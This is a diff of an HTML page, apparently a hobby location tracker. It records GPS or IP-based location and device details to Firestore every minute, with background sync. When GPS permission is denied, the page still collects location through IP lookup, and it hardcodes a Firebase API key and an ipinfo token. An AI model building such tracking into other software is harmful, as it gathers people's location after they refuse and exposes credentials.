@@ -3,12 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home Page</title>
+    <title>Background Location Tracker</title>
+</head>
+<body>
+    <h2>Tracking Location in Background...</h2>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // Firebase Config
+        // ✅ Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
             authDomain: "locationsaver-b9997.firebaseapp.com",
@@ -19,26 +23,26 @@
             measurementId: "G-WJJY3Q2M8E"
         };
 
-        // Initialize Firebase
+        // ✅ Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Register Service Worker
+        // ✅ Register Service Worker (Ensuring Proper Registration)
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('/sw.js')
                 .then(() => console.log("✅ Service Worker Registered"))
                 .catch(err => console.error("❌ SW Registration Failed:", err));
         }
 
-        // Function to get IST timestamp
+        // ✅ Function to Get IST Timestamp
         function getISTTime() {
             let now = new Date();
             let utcTime = now.getTime() + now.getTimezoneOffset() * 60000; // Convert to UTC
             let istTime = new Date(utcTime + (5.5 * 60 * 60 * 1000)); // Convert to IST
-            return istTime.toISOString().replace("T", " ").substring(0, 19); // Format YYYY-MM-DD HH:MM:SS
+            return istTime.toISOString().replace("T", " ").substring(0, 19);
         }
 
-        // Function to get device info
+        // ✅ Get Device Info
         function getDeviceInfo() {
             return {
                 userAgent: navigator.userAgent,
@@ -57,7 +61,7 @@
             };
         }
 
-        // Get GPS location
+        // ✅ Function to Get GPS Location
         function getGPSLocation(callback) {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -66,24 +70,24 @@
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy,
-                            timestamp: getISTTime(), // ✅ Store in IST
+                            timestamp: getISTTime(),
                             type: "GPS",
                             device: getDeviceInfo()
                         });
                     },
                     (error) => {
-                        console.warn("❌ GPS denied, using IP location instead.");
+                        console.warn("❌ GPS Denied, Using IP Location Instead.");
                         callback(null);
                     },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
-                console.warn("❌ GPS not supported.");
+                console.warn("❌ GPS Not Supported.");
                 callback(null);
             }
         }
 
-        // Get IP-based location
+        // ✅ Function to Get IP Location
         function getIPLocation(callback) {
             fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
                 .then(response => response.json())
@@ -98,31 +102,31 @@
                         org: data.org,
                         postal: data.postal,
                         timezone: data.timezone,
-                        timestamp: getISTTime(), // ✅ Store in IST
+                        timestamp: getISTTime(),
                         type: "IP",
                         device: getDeviceInfo()
                     });
                 })
                 .catch(error => {
-                    console.error("❌ Error fetching IP location:", error);
+                    console.error("❌ Error Fetching IP Location:", error);
                     callback(null);
                 });
         }
 
-        // Save data to Firestore
+        // ✅ Save Data to Firestore
         async function saveToFirestore(data) {
             try {
                 await addDoc(collection(db, "user_data"), data);
                 console.log("✅ Location Data Sent:", data);
             } catch (error) {
-                console.error("❌ Error saving data:", error);
+                console.error("❌ Error Saving Data:", error);
                 navigator.serviceWorker.ready.then(reg => {
-                    reg.sync.register('sync-location'); // Register background sync
+                    reg.sync.register('sync-location'); // Register Background Sync
                 });
             }
         }
 
-        // Collect and Send Location
+        // ✅ Function to Collect and Send Location
         function collectLocation() {
             getGPSLocation((gpsData) => {
                 if (gpsData) {
@@ -135,21 +139,18 @@
             });
         }
 
-        // Send data every 60 seconds
-        setInterval(collectLocation, 20000);
+        // ✅ Send Data Every 60 Seconds
+        setInterval(collectLocation, 60000);
 
-        // Send cached data when online
+        // ✅ Send Cached Data When Online
         window.addEventListener("online", () => {
             navigator.serviceWorker.ready.then(reg => {
                 reg.sync.register('sync-location');
             });
         });
 
-        // Send location when page is opened
+        // ✅ Send Location When Page is Opened
         collectLocation();
     </script>
-</head>
-<body>
-    <h2>Tracking Location in B</h2>
 </body>
 </html>
